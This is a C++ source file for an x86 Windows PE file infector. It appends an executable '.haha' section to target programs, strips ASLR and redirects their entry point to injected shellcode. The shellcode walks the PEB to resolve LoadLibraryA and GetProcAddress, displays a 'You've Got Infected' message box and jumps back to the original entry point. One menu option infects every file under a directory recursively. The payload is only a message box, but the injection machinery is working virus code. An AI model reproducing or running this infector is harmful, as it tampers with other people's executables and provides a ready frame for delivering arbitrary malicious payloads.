#include <windows.h>
#include <stdio.h>
#include<iostream>
#include<winnt.h>
#include <tchar.h> 
#include <strsafe.h>
#include <vector>
#include <string>
#include <filesystem>
#include <sys/stat.h>
#pragma comment(lib, "User32.lib")

DWORD align(DWORD size, DWORD align, DWORD addr) {
	if (!(size % align))
		return addr + size;
	return addr + (size / align + 1) * align;
}

int AddSection(LPCSTR filepath, char const* sectionName, DWORD sizeOfSection) {
	HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		CloseHandle(file);
		return 0;
	}
	DWORD fileSize = GetFileSize(file, NULL);
	if (!fileSize) {
		CloseHandle(file);
		//empty file,thus invalid
		return -1;
	}
	//so we know how much buffer to allocate
	BYTE* pByte = new BYTE[fileSize];
	DWORD dw;
	//lets read the entire file,so we can use the PE information
	ReadFile(file, pByte, fileSize, &dw, NULL);

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		CloseHandle(file);
		return -1; //invalid PE
	}
	PIMAGE_NT_HEADERS NT = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
	if (NT->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
		CloseHandle(file);
		return -3;//x64 image
	}
	PIMAGE_SECTION_HEADER SH = IMAGE_FIRST_SECTION(NT);
	WORD sCount = NT->FileHeader.NumberOfSections;

	//lets go through all the available sections,to see if what we wanna add,already exists or not
	for (int i = 0; i < sCount; i++) {
		PIMAGE_SECTION_HEADER x = SH + i;
		if (!strcmp((char*)x->Name, sectionName)) {
			//PE section already exists
			CloseHandle(file);
			return -2;
		}
	}

	ZeroMemory(&SH[sCount], sizeof(IMAGE_SECTION_HEADER));
	CopyMemory(&SH[sCount].Name, sectionName, 8);
	//We use 8 bytes for section name,cause it is the maximum allowed section name size

	//lets insert all the required information about our new PE section
	SH[sCount].Misc.VirtualSize = align(sizeOfSection, NT->OptionalHeader.SectionAlignment, 0);
	SH[sCount].VirtualAddress = align(SH[sCount - 1].Misc.VirtualSize, NT->OptionalHeader.SectionAlignment, SH[sCount - 1].VirtualAddress);
	SH[sCount].SizeOfRawData = align(sizeOfSection, NT->OptionalHeader.FileAlignment, 0);
	SH[sCount].PointerToRawData = align(SH[sCount - 1].SizeOfRawData, NT->OptionalHeader.FileAlignment, SH[sCount - 1].PointerToRawData);
	SH[sCount].Characteristics = 0xE00000E0;

	/*
	0xE00000E0 = IMAGE_SCN_MEM_WRITE |
				 IMAGE_SCN_CNT_CODE  |
				 IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
				 IMAGE_SCN_MEM_EXECUTE |
				 IMAGE_SCN_CNT_INITIALIZED_DATA |
				 IMAGE_SCN_MEM_READ
	*/

	SetFilePointer(file, SH[sCount].PointerToRawData + SH[sCount].SizeOfRawData, NULL, FILE_BEGIN);
	//end the file right here,on the last section + it's own size
	SetEndOfFile(file);
	//now lets change the size of the image,to correspond to our modifications
	//by adding a new section,the image size is bigger now
	NT->OptionalHeader.SizeOfImage = SH[sCount].VirtualAddress + SH[sCount].Misc.VirtualSize;
	//and we added a new section,so we change the NOS too
	NT->FileHeader.NumberOfSections += 1;
	SetFilePointer(file, 0, NULL, FILE_BEGIN);
	//and finaly,we add all the modifications to the file
	WriteFile(file, pByte, fileSize, &dw, NULL);
	CloseHandle(file);
	return 1;
}

bool AddCodeToSection(LPCSTR filepath, char const* sectionName) {
	HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		CloseHandle(file);
		return false;
	}
	DWORD filesize = GetFileSize(file, NULL);
	BYTE* pByte = new BYTE[filesize];
	DWORD dw;
	ReadFile(file, pByte, filesize, &dw, NULL);
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
	
	//ASLR warn
	nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);

	SetFilePointer(file, 0, 0, FILE_BEGIN);
	//lets save the OEP
	DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
	//we change the EP to point to the last section created
	nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
	WriteFile(file, pByte, filesize, &dw, 0);
		//lets obtain the opcodes
	DWORD start(0), end(0);
	__asm {
		mov eax, loc1
		mov[start], eax
		//we jump over the second __asm,so we dont execute it in the infector itself
		jmp over
		loc1 :
	}

	__asm {
		/*
			The purpose of this part is to read the base address of kernel32.dll
			from PEB,walk it's export table (EAT) and search for functions
		*/
		mov eax, fs: [30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16

		mov   ebx, eax; Take the base address of kernel32
		mov   eax, [ebx + 0x3c]; PE header VMA
		mov   edi, [ebx + eax + 0x78]; Export table relative offset
		add   edi, ebx; Export table VMA
		mov   ecx, [edi + 0x18]; Number of names

		mov   edx, [edi + 0x20]; Names table relative offset
		add   edx, ebx; Names table VMA
		// now lets look for a function named LoadLibraryA

		LLA :
		dec ecx
			mov esi, [edx + ecx * 4]; Store the relative offset of the name
			add esi, ebx; Set esi to the VMA of the current name
			cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
			je LLALOOP1
			LLALOOP1 :
		cmp dword ptr[esi + 4], 0x7262694c
			; L(4c)i(69)b(62)r(72)
			je LLALOOP2
			LLALOOP2 :
		cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
			je stop; if its = then jump to stop because we found it
			jmp LLA; Load Libr aryA
			stop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
			add   edx, ebx; Table of ordinals
			mov   cx, [edx + 2 * ecx]; function ordinal
			mov   edx, [edi + 0x1c]; Address table relative offset
			add   edx, ebx; Table address
			mov   eax, [edx + 4 * ecx]; ordinal offset
			add   eax, ebx; Function VMA
			// EAX holds address of LoadLibraryA now


			sub esp, 11
			mov ebx, esp
			mov byte ptr[ebx], 0x75; u
			mov byte ptr[ebx + 1], 0x73; s
			mov byte ptr[ebx + 2], 0x65; e
			mov byte ptr[ebx + 3], 0x72; r
			mov byte ptr[ebx + 4], 0x33; 3
			mov byte ptr[ebx + 5], 0x32; 2
			mov byte ptr[ebx + 6], 0x2e; .
			mov byte ptr[ebx + 7], 0x64; d
			mov byte ptr[ebx + 8], 0x6c; l
			mov byte ptr[ebx + 9], 0x6c; l
			mov byte ptr[ebx + 10], 0x0

			push ebx

			//lets call LoadLibraryA with user32.dll as argument
			call eax;
		add esp, 11
			//save the return address of LoadLibraryA for later use in GetProcAddress
			push eax


			// now we look again for a function named GetProcAddress
			mov eax, fs: [30h]
			mov eax, [eax + 0x0c]; 12
			mov eax, [eax + 0x14]; 20
			mov eax, [eax]
			mov eax, [eax]
			mov eax, [eax + 0x10]; 16

			mov   ebx, eax; Take the base address of kernel32
			mov   eax, [ebx + 0x3c]; PE header VMA
			mov   edi, [ebx + eax + 0x78]; Export table relative offset
			add   edi, ebx; Export table VMA
			mov   ecx, [edi + 0x18]; Number of names

			mov   edx, [edi + 0x20]; Names table relative offset
			add   edx, ebx; Names table VMA
			GPA :
		dec ecx
			mov esi, [edx + ecx * 4]; Store the relative offset of the name
			add esi, ebx; Set esi to the VMA of the current name
			cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
			je GPALOOP1
			GPALOOP1 :
		cmp dword ptr[esi + 4], 0x41636f72
			// backwards remember : ) r(72)o(6f)c(63)A(41)
			je GPALOOP2
			GPALOOP2 :
		cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
			//no need to continue to look further cause there is no other function starting with GetProcAddre
			je stp; if its = then jump to stop because we found it
			jmp GPA
			stp :
		mov   edx, [edi + 0x24]; Table of ordinals relative
			add   edx, ebx; Table of ordinals
			mov   cx, [edx + 2 * ecx]; function ordinal
			mov   edx, [edi + 0x1c]; Address table relative offset
			add   edx, ebx; Table address
			mov   eax, [edx + 4 * ecx]; ordinal offset
			add   eax, ebx; Function VMA
			// EAX HOLDS THE ADDRESS OF GetProcAddress
			mov esi, eax

			sub esp, 12
			mov ebx, esp
			mov byte ptr[ebx], 0x4d //M
			mov byte ptr[ebx + 1], 0x65 //e
			mov byte ptr[ebx + 2], 0x73 //s
			mov byte ptr[ebx + 3], 0x73 //s
			mov byte ptr[ebx + 4], 0x61 //a
			mov byte ptr[ebx + 5], 0x67 //g
			mov byte ptr[ebx + 6], 0x65 //e
			mov byte ptr[ebx + 7], 0x42 //B
			mov byte ptr[ebx + 8], 0x6f //o
			mov byte ptr[ebx + 9], 0x78 //x
			mov byte ptr[ebx + 10], 0x41 //A
			mov byte ptr[ebx + 11], 0x0

			/*
				get back the value saved from LoadLibraryA return
				So that the call to GetProcAddress is:
				esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
			*/

			mov eax, [esp + 12]
			push ebx; MessageBoxA
			push eax; base address of user32.dll retrieved by LoadLibraryA
			call esi; GetProcAddress address : ))
			add esp, 12

			sub esp, 8
			mov ebx, esp
			mov byte ptr[ebx], 89; Y
			mov byte ptr[ebx + 1], 111; o
			mov byte ptr[ebx + 2], 117; u
			mov byte ptr[ebx + 3], 39; '
			mov byte ptr[ebx + 4], 118; v
			mov byte ptr[ebx + 5], 32; space
			mov byte ptr[ebx + 6], 71; G
			mov byte ptr[ebx + 7], 111; o
			mov byte ptr[ebx + 8], 116; t
			mov byte ptr[ebx + 9], 32; space
			mov byte ptr[ebx + 10], 73; I
			mov byte ptr[ebx + 11], 110; n
			mov byte ptr[ebx + 12], 102; f
			mov byte ptr[ebx + 13], 101; e
			mov byte ptr[ebx + 14], 99; c
			mov byte ptr[ebx + 15], 116; t
			mov byte ptr[ebx + 16], 101; e
			mov byte ptr[ebx + 17], 100; d
			mov byte ptr[ebx + 18], 0

			push 0
			push 0
			push ebx
			push 0
			call eax
			add esp, 8

			mov eax, 0xdeadbeef; Original Entry point
			jmp eax
	}

	__asm {
	over:
		mov eax, loc2
			mov[end], eax
			loc2 :
	}

	byte mac[1000];
	byte* fb = ((byte*)(start));
	DWORD* invalidEP;
	DWORD i = 0;

	while (i < ((end - 11) - start)) {
		invalidEP = ((DWORD*)((byte*)start + i));
		if (*invalidEP == 0xdeadbeef) {
			/*
				Because the value of OEP is stored in this executable's data section,
				if we have said mov eax,OEP the self read part of the program will fill in
				a invalid address,since we point to something that only exists here,
				not in the infected PE's data section.
				Solution:
				We put a place holder with the fancy value of 0xdeadbeef,so we later alter this address
				inside the self read byte storage to the value of OEP
			*/
			DWORD old;
			VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &old);
			*invalidEP = OEP;
		}
		mac[i] = fb[i];
		i++;
	}
	SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
	WriteFile(file, mac, i, &dw, 0);
	CloseHandle(file);
	return true;
}

bool removeCode(LPCSTR filepath, char const* sectionName) {
	std::cout << "Removing code from section " << sectionName << std::endl;
	//remove section and update headers
	HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to open file" << std::endl;
		return false;
	}
	DWORD dw;
	IMAGE_DOS_HEADER dos;
	IMAGE_NT_HEADERS nt;
	
	return true;
}

void getFilePath(std::vector<std::string>& files, std::string directory) {
	WIN32_FIND_DATAA data;
	HANDLE hFind;
	if ((hFind = FindFirstFileA((directory + "\\*").c_str(), &data)) != INVALID_HANDLE_VALUE) {
		do {
			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {
					getFilePath(files, directory + "\\" + data.cFileName);
				}
			}
			else {
				files.push_back(directory + "\\" + data.cFileName);
			}
		} while (FindNextFileA(hFind, &data) != 0);
		FindClose(hFind);
	}
}

void printSectionHeaders(PIMAGE_SECTION_HEADER pSectionHeader, PIMAGE_FILE_HEADER pFileHeader) {
	printf("=== Section Table ===\n");
	printf("Section name|\tVirtual size|\tVirtual address|\tRaw size|\tRaw address|\tCharacteristics|\n");
	for (int i = 0; i < pFileHeader->NumberOfSections; i++)
	{

		printf("%s\t%15X\t%15X\t%22X\t%19X\t%15X\n", pSectionHeader[i].Name
			, pSectionHeader[i].Misc.VirtualSize
			, pSectionHeader[i].VirtualAddress
			, pSectionHeader[i].SizeOfRawData
			, pSectionHeader[i].PointerToRawData
			, pSectionHeader[i].Characteristics);
	}
	printf("\n");
}

void printHeaders(PIMAGE_OPTIONAL_HEADER pOptionalHeader) {
	printf("Address of entry point : %08X\n", pOptionalHeader->AddressOfEntryPoint);
	printf("Checksum : %08X\n", pOptionalHeader->CheckSum);
	printf("Image base from %08X to %08X\n", pOptionalHeader->ImageBase, pOptionalHeader->ImageBase + pOptionalHeader->SizeOfImage);
	printf("Image base : %08X \n", pOptionalHeader->ImageBase);
	printf("File alignment : %08X\n", pOptionalHeader->FileAlignment);
	printf("Size of image : %08X\n", pOptionalHeader->SizeOfImage);
	printf("\n");
}
bool DumpPEHeader(LPCSTR filename)
{
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID lpFileBase;
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_FILE_HEADER pFileHeader;
	PIMAGE_OPTIONAL_HEADER pOptionalHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory;
	try {
		// open the file for reading
		hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			throw "CreateFile() failed";

		// create a file mapping object
		hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (hFileMapping == NULL)
			throw "CreateFileMapping() failed";

		// map a view of the file
		lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
		if (lpFileBase == NULL)
			throw "MapViewOfFile() failed";

		// get a pointer to the DOS header
		pDosHeader = (PIMAGE_DOS_HEADER)lpFileBase;

		// check the magic number
		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
			throw "Not a valid executable file";

		// get a pointer to the NT (PE) header
		pNTHeader = (PIMAGE_NT_HEADERS)((LPBYTE)lpFileBase + pDosHeader->e_lfanew);

		// check the signature
		if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
			throw "Not a valid PE file";

		// get pointers to the sections
		pFileHeader = &pNTHeader->FileHeader;
		pOptionalHeader = &pNTHeader->OptionalHeader;
		pSectionHeader = IMAGE_FIRST_SECTION(pNTHeader);

		// print the file sections
		printSectionHeaders(pSectionHeader, pFileHeader);
		printHeaders(pOptionalHeader);
		return true;
	}
	catch (LPCSTR msg) {
		printf("Error: %s\n", msg);
		return false;
	}
}

void menu() {
	std::cout << "1. Add Section" << std::endl;
	std::cout << "2. PE Injection" << std::endl;
	std::cout << "3. Inject Multiple Files" << std::endl;
	std::cout << "4. Dump PE File Information" << std::endl;
	std::cout << "5. Remove section & restore files' EP" << std::endl;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		printf(" [!] Usage: %s <file/directory>\r ", argv[0]);
		return 0;
	}
	try
	{
		menu();
		int choice;
		std::cin >> choice;
		switch (choice)
		{
		case 1:
		{
			LPCSTR filename = argv[1];
			const char* sectionName = ".haha";
			std::cout << "Adding section into file " << filename << std::endl;
			int addRes = AddSection(filename, sectionName, 0x1000);
			switch (addRes) {
			case 0:
				printf("[-] Error adding section: File not found or in use!\n");
				break;
			case 1:
				printf("[+] Section added!\n");
				break;
			case -1:
				printf("[-] Error adding section: Invalid path or PE format!\n");
				break;
			case -2:
				printf("[-] Error adding section: Section already exists!\n");
				break;
			case -3:
				printf("[-] Error: x64 PE detected! This version works only with x86 PE's!\n");
				break;
			}
			std::cout << "Done" << std::endl;
			break;
		}
		case 2: {
			LPCSTR filename = argv[1];
			const char* sectionName = ".haha";
			std::cout << "[!] Injecting Code into file " << filename << std::endl;
			bool injectRes = AddCodeToSection(filename, sectionName);
			if (injectRes)
				printf("[+] Code injected!\n");
			else
				printf("[-] Error injecting code!\n");
			break;
		}
		case 3: {
			std::cout << "[!] Injecting new Section & Code into all files in directory " << argv[1] << std::endl;
			const char* sectionName = ".haha";
			std::vector<std::string> files;
			getFilePath(files, argv[1]);
			for (auto const& file : files) {
				std::cout << "[!] Injecting into file " << file << std::endl;
				int addRes = AddSection(file.c_str(), sectionName, 0x1000);
				if (addRes == 1) {
					bool injectRes = AddCodeToSection(file.c_str(), sectionName);
					if (injectRes)
						printf("[+]Code injected!\n");
					else
						printf("[-] Error injecting code!\n");
				}
			}
			std::cout << "Done!" << std::endl;
			break;
		}
		case 4: {
			std::cout << "[!] Dumping PE File Information" << std::endl;
			DumpPEHeader(argv[1]);
			break;
		}
		case 5:
			LPCSTR filename = argv[1];
			const char* sectionName = ".haha";
			removeCode(argv[1], sectionName);
			break;
		}
	}
	catch (const std::exception&)
	{
		std::cout << "[-] Error: Exception \r\n ";
	}
	
	return 0;
}